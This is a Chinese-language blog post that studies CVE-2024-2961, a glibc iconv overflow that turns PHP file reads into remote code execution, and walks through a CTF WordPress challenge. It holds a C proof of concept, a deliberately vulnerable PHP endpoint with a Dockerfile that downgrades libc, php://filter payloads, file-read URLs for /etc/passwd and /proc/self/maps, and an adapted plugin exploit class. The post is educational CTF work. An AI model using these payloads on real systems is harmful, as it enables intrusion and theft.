---
layout:     post
title:      PHP利用GNU C Iconv将文件读取变成RCE
subtitle:   CVE-2024-2961
date:       2024-07-30
author:     lyk
header-img: img/post-bg-debug.png
catalog: true
tags:
    - php

---

# 0x01 前言

看了春秋杯夏季赛wp，发现那道wordpress就是先扫插件然后找到任意文件读取部分，用CVE-2024-2961来实现反弹shell或直接读操作，觉得这个点有点意思，跟前面学的侧信道、php-filter-chains啥的感觉有所关联，而且放假了也比较闲，于是写一篇文章来学学看看。

首先，这个CVE-2024-2961是Linux GLIBC的库函数iconv缓冲区溢出漏洞，也就是跟二进制关系密切，虽然我对pwn了解不深，但是看看应该还是不难理解emmm，目前已知的利用方式是可以让PHP的任意文件读取漏洞升级的远程命令执行漏洞。

有点类似于我们常说的**LFI to RCE**。

# 0x02 ICONV漏洞

CVE-2024-2961本质上是GLIBC中iconv库的漏洞，漏洞点，位于`glibc/iconvdata/iso-2022-cn-ext.c`文件，相关代码如下：

```c
else if ((used & SS2_mask) != 0 && (ann & SS2_ann) != (used << 8))\
          {                                      \
        const char *escseq;                          \
                                          \
        assert (used == CNS11643_2_set); /* XXX */              \
        escseq = "*H";                              \
        *outptr++ = ESC;                          \
        *outptr++ = '$';                          \
        *outptr++ = *escseq++;                          \
        *outptr++ = *escseq++;                          \
                                          \
        ann = (ann & ~SS2_ann) | (used << 8);                  \
          }                                      \
        else if ((used & SS3_mask) != 0 && (ann & SS3_ann) != (used << 8))\
          {                                      \
        const char *escseq;                          \
                                          \
        assert ((used >> 5) >= 3 && (used >> 5) <= 7);              \
        escseq = "+I+J+K+L+M" + ((used >> 5) - 3) * 2;              \
        *outptr++ = ESC;                          \
        *outptr++ = '$';                          \
        *outptr++ = *escseq++;                          \
        *outptr++ = *escseq++;                          \
                                          \
        ann = (ann & ~SS3_ann) | (used << 8);                  \
          }        
```

在上述代码的这两个分支中，输入会被转换为4字节的输出，且不会检查输出buf的长度。这可能产生6种输出：

```
\x1b$*H        0x1b 0x24 0x2A 0x48
\x1b$+I        0x1b 0x24 0x2b 0x49
\x1b$+J        0x1b 0x24 0x2b 0x4a
\x1b$+K        0x1b 0x24 0x2b 0x4b
\x1b$+L        0x1b 0x24 0x2b 0x4c
\x1b$+M        0x1b 0x24 0x2b 0x4d
```

而PoC如下：

```C
/*
CVE-2024-2961 POC
$ gcc -o poc ./poc.c && ./poc
Remaining bytes (should be > 0): -1
$
*/
#include <iconv.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>

void hexdump(void *ptr, int buflen)
{
    unsigned char *buf = (unsigned char *)ptr;
    int i, j;
    for (i = 0; i < buflen; i += 16)
    {
        printf("%06x: ", i);
        for (j = 0; j < 16; j++)
            if (i + j < buflen)
                printf("%02x ", buf[i + j]);
            else
                printf("   ");
        printf(" ");
        for (j = 0; j < 16; j++)
            if (i + j < buflen)
                printf("%c", isprint(buf[i + j]) ? buf[i + j] : '.');
        printf("\n");
    }
}

void main()
{
    iconv_t cd = iconv_open("ISO-2022-CN-EXT", "UTF-8");

    char input[0x10] = "AAAAA劄";
    char output[0x10] = {0};

    char *pinput = input;
    char *poutput = output;

    // Same size for input and output buffer
    size_t sinput = strlen(input);
    size_t soutput = sinput;

    iconv(cd, &pinput, &sinput, &poutput, &soutput);

    printf("Remaining bytes (should be > 0): %zd\n", soutput);

    hexdump(output, 0x10);
}
```

编译运行

```
$ gcc poc.c -o poc
$ ./poc
./poc
Remaining bytes (should be > 0): -1
000000: 41 41 41 41 41 1b 24 2a 48 00 00 00 00 00 00 00  AAAAA.$*H.......
```

[![img](D:\img\3259464-20240711145535117-1538097801.png)](https://img2024.cnblogs.com/blog/3259464/202407/3259464-20240711145535117-1538097801.png)

我们使用python来看看PoC的特殊字符：

[![img](D:\img\3259464-20240711145643157-177391273.png)](https://img2024.cnblogs.com/blog/3259464/202407/3259464-20240711145643157-177391273.png)

从上面的结果可以看出，这个特殊字符只占3字节，但是却会被转译为`\x1b$*H`四字节，产生了一字节的溢出，上面的PoC似乎还是不太好展示出该漏洞的影响情况，我们可以简单的改改代码，如下所示：

```c
void main()
{
    iconv_t cd = iconv_open("ISO-2022-CN-EXT", "UTF-8");

    char input[0x3] = "劄";
    char output[0x3] = {0};
    char overflow[0x5] = "AAAA";

    char *pinput = input;
    char *poutput = output;

    // Same size for input and output buffer
    size_t sinput = 3;
    size_t soutput = 3;

    size_t status = iconv(cd, &pinput, &sinput, &poutput, &soutput);

    printf("Remaining bytes (should be > 0): %zd\nstatus = %d\n", soutput, status);

    hexdump(output, 0x10);
    printf("overflow = %s\n", overflow);
}
```

[![img](D:\img\3259464-20240711145827688-257435867.png)](https://img2024.cnblogs.com/blog/3259464/202407/3259464-20240711145827688-257435867.png)

从上面的结果可以看出，我们成功的溢出了1字节到`overflow`变量中。

# 0x03 从字节溢出到让PHP的任意文件读取进阶成为RCE

在了解完iconv漏洞原理之后，接下来再看看该漏洞的实际利用场景。目前已公开的漏洞利用场景只有一个，就是把PHP的任意文件读取漏洞转换为远程命令指令漏洞。

对于简单的任意文件读取就是这样：

```php
<?php
$data = file_get_contents($_POST['file']);
echo "File contents: $data";
?>
```

这里我们常规poc用的就是filter编码，常用的是

```
php://filter/read=convert.base64-encode/resource=xxxxx
```

当然也可以用ICONV编码

```
php://filter/read=convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=data:text/plain;base64,xxxxxxx
```

这样我们就可以调用`iconv_open("ISO-2022-CN-EXT", "UTF-8");`，接着控制`iconv`函数的输入buffer，达到触发iconv漏洞的目的。不得不说这个漏洞的发现还是挺具有巧合性的，但是也很水到渠成。

Dockerfile：

```dockerfile
FROM ubuntu:22.04

RUN sed -i 's@//.*archive.ubuntu.com@//mirrors.ustc.edu.cn@g' /etc/apt/sources.list
RUN sed -i 's/security.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list
RUN apt update && apt install -y nginx php-fpm
# libc降级到有漏洞的版本
RUN apt install -y libc6-dev=2.35-0ubuntu3 libc-dev-bin=2.35-0ubuntu3 libc6=2.35-0ubuntu3
COPY index.php /var/www/html/index.php
COPY nginx.conf /etc/nginx/sites-enabled/default
COPY start.sh /start.sh
RUN chmod +x /start.sh

CMD ["start.sh"]
```

index.php：

```php
<?php
$data = file_get_contents($_POST['file']);
echo "File contents: $data";
?>
```

nginx.conf：

```nginx
server {
    listen 80 default_server;
    listen [::]:80 default_server;


    root /var/www/html;

    index index.php;

    server_name _;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
            fastcgi_split_path_info ^(.+\.php)(/.+)$;
            fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;
            fastcgi_index index.php;
            include fastcgi_params;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param PATH_INFO $fastcgi_path_info;
        }


}
```

start.sh：

```shell
#!/bin/bash
/etc/init.d/php8.1-fpm start
nginx -g 'daemon off;'
```

搭好环境后直接可以测poc。

# 0x04 poc分析

公开的是python代码poc，由于比较长，这里只放个链接[cnext-exploits/cnext-exploit.py at main · ambionics/cnext-exploits (github.com)](https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py)：

1. 首先，对目标是否能进行漏洞利用进行检测，该检测过程没法检测目标是否存在漏洞，只能检测目标是否存在进行漏洞利用的条件，有以下三个方面：
   - 检测目标的任意文件读是否支持：`data:text/plain;base64,`。
   - 检测目标的任意文件读是否支持：`php://filter//resource=data:text/plain;base64,`。
   - 检测目标的任意文件读是否支持：`php://filter/zlib.inflate/resource=data:text/plain;base64,`。
2. 通过`/proc/self/maps`获取目标的内存布局，获取目标libc文件。获取目标内存布局需要获取libc的基地址，PHP堆的基地址。libc的基地址很好获取，但是PHP堆的基地址就得猜测，没办法100%确定，PHP堆有以下条件：
   - 大小在`0x200000`之上，并且为该大小的倍数，所以还需要0x200000对齐。
   - 该内存段不属于任何二进制文件。
   - 该内存段的权限为：`rw-p`
3. 构造Payload，发送Payload到目标进行漏洞利用。

后续就是很二进制风格的内容了，建议去详看[CVE-2024-2961 漏洞分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/403508.html)，对于我自己这个二进制菜鸡来说就懒得看了hhh

经过几篇文章的大致分析发现，公开的PoC已经非常完善了，利用链无法进一步优化，并且已经进行了两次zlib压缩，能把payload压缩到非常短。

虽然目前公开的只有对PHP进行利用的PoC，但是iconv漏洞的影响面仍非常广泛，后续将继续对iconv的使用面进行研究，以确定是否还有其他应用受到了该漏洞的影响。

# 0x05 赛题回顾

回到那道wordpress，先使用mail-masta 的 CVE-2016-10956读取/var/www/html/wp-content/database/.ht.sqlite拿账密(https://github.com/p0dalirius/CVE-2016-10956-mail-masta/blob/master/CVE-2016-10956_mail_masta.py)

有任意文件读取

```
/wp-admin/admin-ajax.php?action=rvm_import_regions&nonce=5&rvm_mbe_post_id=1&rvm_upload_regions_file_path=/etc/passwd
```

但是有很多标签导致无法读取完整，这里采用的就是用php://filter/下载maps和libc.so：

```
/usr/lib/x86_64-linux-gnu/libc.so.6
/proc/self/maps
```

对于题目而言，改改payload的这个remote类：

```python
def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()
        self.session.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
            "Cookie":"wordpress_=subscriber%7C1720336162%7CpgTrhwuO3kuzcmwR58cvhthcb45qUx7UkYRiYDYPlW1%7Cb847e13631b08d8e6cb3528b7b3ffe5cfc26e3dd7be5a4dc9dcdc0151c0be873; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1720026818,1720091541,1720161557; HMACCOUNT=06D642FA6D3CD649; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1720161560; PHPSESSID=6fd15deed30423894715ced0e98b545f; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_=subscriber%7C1720336162%7CpgTrhwuO3kuzcmwR58cvhthcb45qUx7UkYRiYDYPlW1%7Ce0c1af65c1951fece8672cc3b08c4d583a056923594d950558734c06b49e22b8; wp-settings-time-5=1720163412"}
    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """
        print(path)
        req = self.session.post(self.url + "/wp-admin/admin-ajax.php?action=rvm_import_regions&nonce=5&rvm_mbe_post_id=1&rvm_upload_regions_file_path="+quote(path))
        return req
        #return self.session.get(self.url + "/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php/?url=" + quote(path))
        
    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        print(response)
        data = response.re.search(b" name=\"(.*)\[\]", flags=re.S).group(1)
        try:
            return base64.decode(data)
        except Exception as e:
            print(e)
            return data
```

然后本地生成payload打RCE，通过 responsive-vector-maps 的任意文件读来发反弹 shell：

RVM 的 Subscriber+ 读：

[![img](D:\img\3259464-20240711155426630-1828297962.png)](https://img2024.cnblogs.com/blog/3259464/202407/3259464-20240711155426630-1828297962.png)

[![img](D:\img\3259464-20240711154037598-921784113.png)](https://img2024.cnblogs.com/blog/3259464/202407/3259464-20240711154037598-921784113.png)

也可以写文件

```
/readflag > /var/www/html/flag
```

 

自搭环境测试：

[![img](D:\img\3259464-20240711223134061-1683950617.png)](https://img2024.cnblogs.com/blog/3259464/202407/3259464-20240711223134061-1683950617.png)

需要linux解释器和python3.10+，这里由于我这边网不好，以及dockerhub被墙了的缘故，很多包安装都很折磨，但最后还是打成功了：

[![img](\img\3259464-20240716163118809-378354054.png)](https://img2024.cnblogs.com/blog/3259464/202407/3259464-20240716163118809-378354054.png)



 下面贴一点非预期:

- 可以通过几个存在 LFI 的插件的 include 点来打 perlcmd 进行木马写入 (by 春秋杯 1 群群友)
- 可以通过 wpscan 扫描到 subscriber 用户猜测弱密码 (by 珂字辈)

# 0x06 参考

[【翻译】从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎（篇一） - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/14690?time__1311=GqAhYKBK0K7Ie05DKA4YwC%3D8di%3DpPL3x)

[【翻译】从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎（篇二） - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/14867?time__1311=GqA2Y5AKiKYKGNDQXKBIc4QqEbD97cCioD)

[CVE-2024-2961 漏洞分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/403508.html)

[ambionics/cnext-exploits: Exploits for CNEXT (CVE-2024-2961), a buffer overflow in the glibc's iconv() (github.com)](https://github.com/ambionics/cnext-exploits/tree/main)

[Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 1) (ambionics.io)](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)

[CVE-2024-2961 漏洞分析 (seebug.org)](https://paper.seebug.org/3177/)

[2024春秋杯网络安全联赛夏季赛WP(web) (qq.com)](https://mp.weixin.qq.com/s/EKBKqUahofFUBMO4X1IGwg?poc_token=HAB9j2aj3a5B_mtZcg2Ztbrb6eh7MecE9zvZzhYu)

[2024春秋杯网络安全联赛夏季赛 - Web w0rdpress 题解 - Kengwang 博客](https://blog.kengwang.com.cn/archives/640/)https://www.leavesongs.com/PENETRATION/php-challenge-2023-oct.html)

[从春秋杯夏季赛wordpress引发的CVE-2024-2961思考浅析 - Eddie_Murphy - 博客园 (cnblogs.com)](https://www.cnblogs.com/EddieMurphy-blogs/p/18296185)
